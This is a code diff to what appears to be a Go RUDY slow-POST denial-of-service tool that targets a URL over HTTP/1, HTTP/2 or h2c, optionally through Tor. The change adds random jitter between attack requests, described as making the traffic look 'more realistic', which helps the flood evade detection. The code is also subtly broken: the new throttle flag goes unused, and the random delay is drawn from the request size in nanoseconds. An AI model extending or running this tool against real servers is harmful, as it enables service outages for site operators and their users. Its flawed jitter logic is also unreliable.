@@ -1,6 +1,10 @@
 package commands
 
 import (
+	"crypto/rand"
+	"encoding/binary"
+	"errors"
+	"fmt"
 	"math"
 	"net/http"
 	"sync"
@@ -23,6 +27,7 @@ var (
 	headers     []string
 	url         string
 	protocol    string
+	throttle    time.Duration
 	insecure    bool
 )
 
@@ -44,6 +49,8 @@ func (*Run) SetFlags(flags *pflag.FlagSet) {
 	flags.StringVarP(&url, "url", "u", "", "Target URL to send the attack to.")
 	flags.StringVar(&protocol, "protocol", string(request.ProtocolHTTP1),
 		"HTTP protocol: http1 (chunked RUDY), http2 (TLS h2), h2c (cleartext HTTP/2).")
+	flags.DurationVarP(&throttle, "throttle", "d", 0,
+		"Random throttle duration between requests to add more realistic ping")
 	flags.BoolVarP(&insecure, "insecure", "k", false, "Skip TLS certificate verification (lab use).")
 
 	if headersParam != nil {
@@ -106,10 +113,15 @@ func (*Run) Run() RunCmd {
 					return
 				}
 
+				current, err := uint64N(isize)
+				if err != nil {
+					logger.Logger.Sugar().Error(err)
+				}
+
 				req := request.NewRequest(request.Options{
 					Size:     int64(isize),
 					URL:      url,
-					Delay:    interval,
+					Delay:    interval + time.Duration(int64(current)), //nolint:gosec
 					Method:   method,
 					Headers:  headers,
 					Protocol: proto,
@@ -117,7 +129,7 @@ func (*Run) Run() RunCmd {
 					Tor:      tor,
 				})
 
-				err := req.Send()
+				err = req.Send()
 				if err == nil {
 					logger.Logger.Sugar().Infof("Request successfully sent to %s", url)
 				}
@@ -125,6 +137,31 @@ func (*Run) Run() RunCmd {
 		}
 
 		waitgroup.Wait()
+	}
+}
+
+// ErrNMustBeGreaterThan0 error.
+var ErrNMustBeGreaterThan0 = errors.New("n must be > 0")
+
+func uint64N(input uint64) (uint64, error) {
+	if input == 0 {
+		return 0, ErrNMustBeGreaterThan0
+	}
+
+	threshold := -input % input
+
+	var buf [8]byte
+
+	for {
+		_, err := rand.Read(buf[:])
+		if err != nil {
+			return 0, fmt.Errorf("failed to generate random bytes: %w", err)
+		}
+
+		x := binary.LittleEndian.Uint64(buf[:])
+		if x >= threshold {
+			return x % input, nil
+		}
 	}
 }
 
